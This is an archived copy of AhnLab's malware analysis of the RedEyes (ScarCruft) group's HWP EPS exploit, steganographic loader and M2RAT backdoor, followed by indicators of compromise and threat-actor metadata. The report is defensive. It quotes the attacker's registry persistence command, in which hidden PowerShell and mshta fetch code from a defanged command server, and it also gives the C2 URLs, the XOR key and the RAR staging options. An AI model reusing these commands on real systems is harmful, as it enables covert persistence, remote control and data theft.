{
    "id": "b4592529-9bfa-42be-9d7c-a1421b22cb21",
    "created_at": "2023-03-02T02:06:24.677038Z",
    "updated_at": "2025-03-27T02:16:37.125288Z",
    "deleted_at": null,
    "sha1_hash": "18f2fa0dd7b7178ba88d5a5d412d86bf3df43c28",
    "title": "HWP Malware Using the Steganography Technique: RedEyes (ScarCruft)",
    "authors": "AhnLab",
    "file_creation_date": "2023-03-01T03:22:03Z",
    "file_modification_date": "2023-03-01T03:22:03Z",
    "file_size": 1589322,
    "plain_text": "# HWP Malware Using the Steganography Technique: RedEyes (ScarCruft)\n\n**asec.ahnlab.com/en/48063**\n\nBy muhan February 21, 2023\n\nIn January, the ASEC (AhnLab Security Emergency response Center) analysis team discovered that the RedEyes threat\ngroup (also known as APT37, ScarCruft) had been distributing malware by exploiting the HWP EPS (Encapsulated\nPostScript) vulnerability (CVE-2017-8291). This report will share the RedEyes group’s latest activity in Korea.\n\n## 1. Overview\n\nThe RedEyes group is known for targeting specific individuals and not corporations, stealing not only personal PC\ninformation but also the mobile phone data of their targets. A distinct characteristic of the latest RedEyes group attack is\nthe fact that they exploited the HWP EPS vulnerability using the steganography technique to distribute their malware.\n\nThe HWP EPS vulnerability used in the attacks is an old vulnerability that has already been patched in the latest version\nof the Hangul Word Processor. We assume that the threat actor initiated their attacks after checking in advance if their\ntargets (individuals) were using an older version of HWP that supports EPS. Furthermore, there is a confirmed past case\nwhere the RedEyes group used the steganography technique to distribute malware. In 2019, Kaspersky shared a report\nsaying that the ScarCruft (RedEyes) group’s downloader used the steganography technique to download additional\nmalware.\n\nThe usage of the steganography technique to download malware and the RUN key command for autorun registration to\nestablish a consistent connection with the C&C server being similar to the format used by the RedEye group in the past\nare the reasons why we believe they had done this attack.\n\nThe RedEyes group is also known for using Powershell and the Chinotto malware to steal PC information and remote\ncontrol systems. However, a new malware strain was found in the latest attack which, unlike Chinotto, uses the shared\nmemory section to carry out C&C commands.\n\nRegarding the newly identified malware, the ASEC analysis team named it **M2RAT (Map2RAT) after the name found**\nin the shared memory section.\n\nFigure 1. Shared memory section name info\n\nThis report covers the TTPs (Tactics, Techniques, and Procedures) of the RedEyes group’s initial access, defense evasion,\npersistence, and the newly identified M2RAT’s latest command control and exfiltration.\n\n\n-----\n\nFigure 2. Flow chart of the attack scenario\n\n## 2. Analysis\n\n### 2.1. Initial Access\n\nOn January 13, an HWP EPS vulnerability (CVE-2017-8291) attack involving the usage of the filename “Form.hwp” was\ndiscovered by AhnLab’s ASD (AhnLab Smart Defense). The HWP document was not collected at the time of the analysis,\nbut we were able to procure the EPS file that triggered the aforementioned vulnerability.\n\nFigure 3. ASD infrastructure log\n\nEPS is a type of graphic format that uses the PostScript programming language by Adobe to show graphics. Highresolution vector images can be shown through EPS and the Hangul Word Processor supported a third-party module\n(ghostscript) to process EPS files. However, due to an increase in malicious EPS vulnerability exploitations, such as APT\nattacks, [Hancom has removed the third-party EPS processing module.](https://www.hancom.com/board/noticeView.do?artcl_seq=6606)\n\n[Additionally, the ASEC analysis team posted a detailed analysis report on the CVE-2017-8291 vulnerability back in 2019.](https://asec.ahnlab.com/wp-content/uploads/tistory/1239_AhnLab_ASEC_%ED%95%9C%EA%B8%80%ED%8C%8C%EC%9D%BC%EC%97%90%EC%88%A8%EC%96%B4%EB%93%A0%EA%B3%A0%EC%8A%A4%ED%8A%B8.pdf)\n\nThe “Form.hwp” file includes a vulnerable EPS file (CVE-2017-8291) which is shown in Figure 4. When the user opens\nthe file (“Form.hwp”), the vulnerability allows the threat actor’s shellcode to run through the third-party module.\n\nFigure 4. EPS vulnerability code within “Form.hwp”\n\n\n-----\n\nFigure 5. Stage 1: Shellcode execution through EPS vulnerability\n\nThe shellcode downloads an image file (JPEG) from the threat actor’s server (C&C) and decrypts the encoded PE file\ncontained within the image file. Afterward, it creates the PE file in the %temp% path before executing it.\n\n### 2.2. Defense Evasion\n\nThe shellcode downloaded an image file from the threat actor’s server and executed an additional piece of malware. In\nother words, the threat actor used the steganography technique to embed a malware strain within an image. We assume\nthat this was done to evade network detection. It appears that the steganography image file used by the threat actor was\nobtained from a wallpaper-sharing website called “wallup.net”.\n\n\n-----\n\nFigure 6. Steganography image file\n\nThe image file consists of a normal JPEG header, the meta data required for decoding the PE file (XOR key and file size),\nand the encoded PE file.\n\nFigure 7. Configuration info of steganography image\n\nA 16-byte XOR key is used for PE decoding to XOR 1 byte at a time.\n\n\n-----\n\n16 byte xor key : FD DD 28 F5 7C 48 8E 7E 0C E0 17 77 35 87 3B 49\n(0xFD xor 0xB0) = 0x4D (M)\n\n(0xDD xor 0x87) = 0x5A (Z)\n\n(0x28 xor 0xB8) = 0x90\n\n(0xF5 xor 0xF5) = 0x00\n\n(* MZ is the signature of the PE file.)\n\nThe ultimately decoded PE file is created and executed under the name lskdjfel.exe in the %temp% path. The executed\nPE file is responsible for downloading an additional backdoor malware (M2RAT), injecting it into explorer.exe, and\nadding both Powershell and mshta commands to the autorun registry Run key to establish a persistent connection with\nthe threat actor’s server.\n\n### 2.3. Persistence\n\nThe executed lskdjfel.exe file registers the following command to the registry Run key to establish a persistent\nconnection with the threat actor’s server.\n\nRegistry key path: HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nValue name: RyPO\nValue: c:\\windows\\system32\\cmd.exe /c PowerShell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep\nbypass ping -n 1 -w 340328 2.2.2.2 || mshta hxxps://www.*****elearning.or[.]kr/popup/handle/1.html\n\nFigure 8. Stage 2: Execution of the decrypted PE file (Backdoor download and ensuring persistence)\n\nThe command registered to the registry Run key was found to be similar to that of the ScarCruft (RedEyes) group report\npublished by Kaspersky in 2021.\n\n**[ScarCruft’s registry Run key command in 2021 (by Kaspersky)]**\n\nc:\\windows\\system32\\cmd.exe /c PowerShell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass ping\n-n 1 -w 300000 2.2.2.2 || mshta hxxp://[redacted].cafe24[.]com/bbs/probook/1.html\n\n\n-----\n\n[RedEyes (ScarCruft) registry Run key command in 2023]\n\nc:\\windows\\system32\\cmd.exe /c PowerShell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass ping\n-n 1 -w 340328 2.2.2.2 || mshta hxxps://www.*******elearning.or[.]kr/popup/handle/1.html\n\nWhenever the affected host PC is booted up, the registry key causes Powershell and the normal Windows utility, mshta,\nto also be executed. At the time of analysis, an HTA (HTML Application) file containing a JS (JavaScript) code was\ncollected from the “1.html” file that mshta had downloaded from the threat actor’s server.\n\nThe JS code is responsible for executing the Powershell command, which receives and executes commands from the\nthreat actor’s server, and returns the results.\n\nWhen the Powershell adds a “U” parameter to the threat actor’s server address when transmitting the computer name\nand username, the threat actor’s server encodes the CMD command that is going to be executed in BASE64 before\nsending it to the affected host. The encoded BASE64 command is then decoded by Powershell and executed. The result\nof the command is saved as a file in the %temp%\\vnGhazwFiPgQ path. Afterward, an “R” parameter is added to the\nthreat actor’s server which then encodes the command execution result in BASE64 before sending it.\n\nhxxps://www.*******elearning.or[.]kr/popup/handle/log.php? U=[Computer Name]+[Username] //\nReceive the threat actor’s command\nhxxps://www.*******elearning.or[.]kr/popup/handle/log.php? R=[BASE64-encoded] // Send command\nexecution result\n\n\n-----\n\nFigure 9. Persistence-related Powershell code\n\n### 2.4. M2RAT (Map2RAT)\n\nThe ultimately executed backdoor operates after being injected into explorer.exe. The main features of this backdoor are\nsimilar to those of basic remote control malware, which include keylogging, data leakage (files and recordings), running\nor terminating processes, and capturing screenshots.\n\n\n-----\n\nFigure 10. Stage 3: Execution of M2RAT backdoor\n\nHowever, the recently discovered backdoor has a different command system compared to the previously identified\nChinotto malware. It does not save the keylogging data or screenshot logs in the affected system but instead sends them\nto the threat actor’s server, leaving no traces of the stolen data in the affected system.\n\nThe ASEC analysis team named this newly identified malware M2RAT ( Map2 RAT) after the common name within the\nshared memory section used during C&C communication.\n\nFileInput Map2\nProcessInput Map2\nCaptureInput Map2\nRawInput Map2\nRegistryModuleInput Map2\nTypingRecordInput Map2\nUsbCheckingInput Map2\n\n**2.4.1. Command and Control of M2RAT**\n\nM2RAT’s C&C communications command system involves receiving commands from the threat actor’s server through\nthe POST method’s Body. The meaning of these command can be found in the below Table 1.\n\n\n-----\n\nFigure 11. Screenshot of M2RAT’s C&C communications (Fiddler)\n\n**C&C Command** **Description**\n\nOKR Command received upon initial connection with C&C communications\n\nURL Edits the registry key value to update the C&C\n\nUPD Updates the currently connected C&C\n\nRES Ends C&C connection (End M2RAT)\n\nUNI Ends C&C connection (End M2RAT)\n\nCMD Performs remote control commands (Keylogging and process creation/execution)\n\nTable 1. Description of threat actor’s commands\n\nM2RAT’s threat actor server manages hosts with MAC addresses in order to distinguish affected hosts. When infected\nwith M2RAT, the MAC address is encoded (XOR) with 0x5c and saved in the “HKCU\\Software\\OneDriver” path’s\n“Version” value. The encoded MAC address value is used to distinguish affected hosts in the threat actor’s server.\n\nRegistry key path: HKCU\\Software\\OneDriver\nValue name: Version\nValue: Value that XOR-encoded (0x5c) MAC address of the affected host\n\nThe result value of the command sent by the threat actor to the affected host is saved in the “_Encoded MAC Address\nValue_2” folder of the threat actor’s server. The screenshots taken by M2RAT from the affected host are saved in the\n“_Encoded MAC Address Value_cap” folder. (Refer to Figure 12)\n\nFigure 12. Threat actor’s server (Example)\n\n**(The server screen in Figure 12 is a screen created by AhnLab’s analysis system to resemble the threat actor’s web**\n\n**server.)**\n\n\n-----\n\nAdditionally, M2RAT XOR encodes with 0x5c and saves the threat actor s server address info in the Property value of\nthe same registry key path as the MAC address.\n\nRegistry key path: HKCU\\Software\\OneDriver\nValue name: Property\nValue: Value that XOR-encoded (0x5c) threat actor’s server address\n\nIn the future, the threat actor can transmit the “URL” and “UPD” commands to M2RAT to update their server address\n(Refer to Table 1). The “URL” command is used to update the registry key with a new address and the “UPD” command\nis used to change the threat actor’s address defined in the currently running instance of M2RAT.\n\nThe remote control command of M2RAT is established by transmitting CMD commands from the threat actor’s server.\nThe Chinotto malware, which was confirmed to have been used by the RedEyes group in the past, executed remote\ncontrol commands through the Query String method, but M2RAT creates a shared memory section to execute the\ncommands from the threat actor’s server. Like the threat actor’s use of the steganography technique in the initial breach\nstage, this appears to also be for the purpose of evading network detection by hiding the command info in the Body of\nthe POST.\n\n(* Query String: A string that starts with a question mark at the end of a URL)\n\nThe CMD command is transmitted through the shared memory. The memory section name info is shown below in Table\n2.\n\n**Section Name** **Feature**\n\nRegistryModuleInputMap2 Transmits additional module execution results (e.g. Mobile phone data leak module)\n\nFileInputMap2 Explores drives (A:\\ – Z:\\), create/write files, and changes file time\n\nCaptureInputMap2 Screenshots the current screen of the affected host’s PC\n\nProcessInputMap2 Checks the process list, create/terminate processes\n\nRawInputMap2 Use ShellExectueExW API to run process\n\nTypingRecordInputMap2 Leaks keylogging data\n\nUsbCheckingInputMap2 USB data leak\n\n(hwp, doc, docx, xls, xlsx, ppt, pptx, cell, csv, show, hsdt, mp3, amr, 3gp, m4a, txt,\npng, jpg, jpeg, gif, pdf, eml)\n\nTable 2. Features of the shared memory section\n\n**2.4.2. Exfiltration**\n\nM2RAT’s exfiltration features include screenshots of the affected host’s screen, process information, keylogging\ninformation, and data (documents and voice files) leaks. In the case of screenshots, they are taken regularly even if a\ncommand is not given by the threat actor. They are then sent to the threat actor’s server where they are saved as\n“result_[number]” in the “_Encoded MAC Address Value_cap” folder.\n\nThe remaining data leaks are saved in the “_Encoded MAC Address Value_2” folder.\n\nIf there are documents or voice recordings with sensitive data in removable storage devices or shared folders, then these\nare copied into the %TEMP% path, compressed into a password-protected file with Winrar (RAR.exe), and the results\nare then transmitted to the threat actor’s server.\n\nFolder path where data is copied to: %Temp%\\Y_%m_%d_%H_%M_%S // (e.g. %TEMP%\\Year_Month_Date\n_Hour_Minute_Second)\nFile extensions: hwp, doc, docx, xls, xlsx, ppt, pptx, cell, csv, show, hsdt, mp3, amr, 3gp, m4a, txt, png, jpg, jpeg,\ngif, pdf, eml\n\n\n-----\n\nThe RAR.exe options that are used are as follows. The path the compressed file is created into is the same as the\n%TEMP% folder path.\n\na -df -r -hp **dgefiue389d@39r#1Ud -m1 “Compressed file creation path” “Compression target path”**\n\n**Option Name** **Description**\n\na Compress\n\ndf Delete file after compression\n\nr Recover compressed file\n\nhp Encrypt file data and header\n\nm Set compression level\n\nTable 3. Explanation of RAR compression options\n\nThe ASEC analysis team was also able to uncover through the ASD (AhnLab Smart Defense) infrastructure an Infostealer\ncommunicating with M2RAT. This malware was identified as a .NET file that steals files saved on mobile phones and\nsends them to the **RegistryModuleResultMap2 shared memory section of M2RAT.**\n\nFigure 13. Code that transmits exfiltrated data to M2RAT\n\n\n-----\n\nFigure 14. Mobile phone data theft target (file extension) info\n\nThe .NET file’s PDB info is as follows.\n\nPDB :\nE:\\MyWork\\PhoneDataCp\\PhoneDeviceManager\\PhoneDeviceManager\\obj\\x86\\Release\\PhoneDeviceManager.pdb\n\n## 3. Conclusion\n\n\n-----\n\nThe RedEyes group is an APT hacking organization that is supported on a national level. They are known to attack\nindividual targets such as human rights activists, reporters, and North Korean defects. Their aim appears to be\nexfilitration. Defending against such APT attacks is an extremely complicated process. Especially since the RedEyes\ngroup is known to target individuals instead of corporations. It is difficult for individuals to even realize they have been\naffected. The ASEC analysis team is closely tracking this group. Should a new TTPs be found from this threat actor, we\nwill quickly share the details as we did in this blog post to contribute towards minimizing damage.\n\n## 4. IOC\n\n[MD5 (Detection name, engine version)]\n\n8b666fc04af6de45c804d973583c76e0 // EPS file – Exploit/EPS.Generic (2023.01.16.03)\n\n93c66ee424daf4c5590e21182592672e // Steganography JPEG – Data/BIN.Agent (2023.02.15.00)\n\n7bab405fbc6af65680443ae95c30595d // PE file(JPEG) Stage PE file – Trojan/Win.Loader.C5359534 (2023.01.16.03)\n\n9083c1ff01ad8fabbcd8af1b63b77e66 // Powershell script – Downloader/PS.Generic.SC185661 (2023.01.16.03)\n\n4488c709970833b5043c0b0ea2ec9fa9 // M2RAT – Trojan/Win.M2RAT.C5357519 (2023.01.14.01)\n\n7f5a72be826ea2fe5f11a16da0178e54 // Mobile phone data theft – Infostealer/Win.Phone.C5381667 (2023.02.14.03)\n\n## 5. References\n\n[Categories:Malware Information](https://asec.ahnlab.com/en/category/malware-information-en/)\n\n[Tagged as:APT37,M2RAT,MaptoRAT,RedEyes,ScarCruft](https://asec.ahnlab.com/en/tag/apt37-en/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/966vmmu8zehyqszqaygziq84fbrvvn3v"
    ],
    "report_names": [
        "Ahnlab_HWP-Malware-Steganography-ScarCruft(02-21-2023)"
    ],
    "threat_actors": [
        {
            "id": "bbe36874-34b7-4bfb-b38b-84a00b07042e",
            "created_at": "2022-10-25T15:50:23.375277Z",
            "updated_at": "2025-03-27T02:00:55.457787Z",
            "deleted_at": null,
            "main_name": "APT37",
            "aliases": [
                "APT37",
                "InkySquid",
                "ScarCruft",
                "Group123",
                "TEMP.Reaper",
                "Ricochet Chollima"
            ],
            "source_name": "MITRE:APT37",
            "tools": [
                "BLUELIGHT",
                "CORALDECK",
                "KARAE",
                "SLOWDRIFT",
                "ROKRAT",
                "SHUTTERSPEED",
                "POORAIM",
                "HAPPYWORK",
                "Final1stspy",
                "Cobalt Strike",
                "NavRAT",
                "DOGCALL",
                "WINERACK"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "552ff939-52c3-421b-b6c9-749cbc21a794",
            "created_at": "2023-01-06T13:46:38.742547Z",
            "updated_at": "2025-03-27T02:00:02.906537Z",
            "deleted_at": null,
            "main_name": "APT37",
            "aliases": [
                "ScarCruft",
                "Venus 121",
                "Moldy Pisces",
                "Group 123",
                "APT 37",
                "Group123",
                "Operation Daybreak",
                "Operation Erebus",
                "Red Eyes",
                "TA-RedAnt",
                "InkySquid",
                "Reaper Group",
                "Ricochet Chollima",
                "ATK4",
                "G0067"
            ],
            "source_name": "MISPGALAXY:APT37",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f0bccc3d-ad77-49c4-8dfd-8a8a8d6fba26",
            "created_at": "2024-05-01T02:03:08.134022Z",
            "updated_at": "2025-03-27T02:05:17.415028Z",
            "deleted_at": null,
            "main_name": "NICKEL FOXCROFT",
            "aliases": [
                "Group 123 ",
                "Moldy Pisces ",
                "RICOCHET CHOLLIMA ",
                "Reaper ",
                "ScarCruft ",
                "APT37 "
            ],
            "source_name": "Secureworks:NICKEL FOXCROFT",
            "tools": [
                "ROKRAT"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "9b02c527-5077-489e-9a80-5d88947fddab",
            "created_at": "2022-10-25T16:07:24.103499Z",
            "updated_at": "2025-03-27T02:02:10.108504Z",
            "deleted_at": null,
            "main_name": "Reaper",
            "aliases": [
                "APT 37",
                "ATK 4",
                "Cerium",
                "Crooked Pisces",
                "Geumseong121",
                "Group 123",
                "ITG10",
                "InkySquid",
                "Moldy Pisces",
                "Opal Sleet",
                "Operation Are You Happy?",
                "Operation Battle Cruiser",
                "Operation Black Banner",
                "Operation Daybreak",
                "Operation Dragon messenger",
                "Operation Erebus",
                "Operation Evil New Year",
                "Operation Evil New Year 2018",
                "Operation Fractured Block",
                "Operation Fractured Statue",
                "Operation FreeMilk",
                "Operation Golden Bird",
                "Operation Golden Time",
                "Operation High Expert",
                "Operation Holiday Wiper",
                "Operation Korean Sword",
                "Operation North Korean Human Right",
                "Operation Onezero",
                "Operation Rocket Man",
                "Operation SHROUDED#SLEEP",
                "Operation STARK#MULE",
                "Operation STIFF#BIZON",
                "Operation Spy Cloud",
                "Operation Star Cruiser",
                "Osmium",
                "Red Eyes",
                "Ricochet Chollima",
                "Ruby Sleet",
                "ScarCruft",
                "TA-RedAnt",
                "TEMP.Reaper",
                "Venus 121"
            ],
            "source_name": "ETDA:Reaper",
            "tools": [
                "Agentemis",
                "BLUELIGHT",
                "Backdoor.APT.POORAIM",
                "CARROTBALL",
                "CARROTBAT",
                "CORALDECK",
                "Cobalt Strike",
                "CobaltStrike",
                "DOGCALL",
                "Erebus",
                "Exploit.APT.RICECURRY",
                "Final1stSpy",
                "Freenki Loader",
                "GELCAPSULE",
                "GOLDBACKDOOR",
                "GreezeBackdoor",
                "HAPPYWORK",
                "JinhoSpy",
                "KARAE",
                "KevDroid",
                "Konni",
                "MILKDROP",
                "N1stAgent",
                "NavRAT",
                "Nokki",
                "Oceansalt",
                "POORAIM",
                "PoohMilk",
                "PoohMilk Loader",
                "RICECURRY",
                "RUHAPPY",
                "RokRAT",
                "SHUTTERSPEED",
                "SLOWDRIFT",
                "SOUNDWAVE",
                "SYSCON",
                "Sanny",
                "ScarCruft",
                "StarCruft",
                "Syscon",
                "VeilShell",
                "WINERACK",
                "ZUMKONG",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1677722784,
    "ts_updated_at": 1743041797,
    "ts_creation_date": 1677640923,
    "ts_modification_date": 1677640923,
    "files": {
        "pdf": "https://archive.orkl.eu/18f2fa0dd7b7178ba88d5a5d412d86bf3df43c28.pdf",
        "text": "https://archive.orkl.eu/18f2fa0dd7b7178ba88d5a5d412d86bf3df43c28.txt",
        "img": "https://archive.orkl.eu/18f2fa0dd7b7178ba88d5a5d412d86bf3df43c28.jpg"
    }
}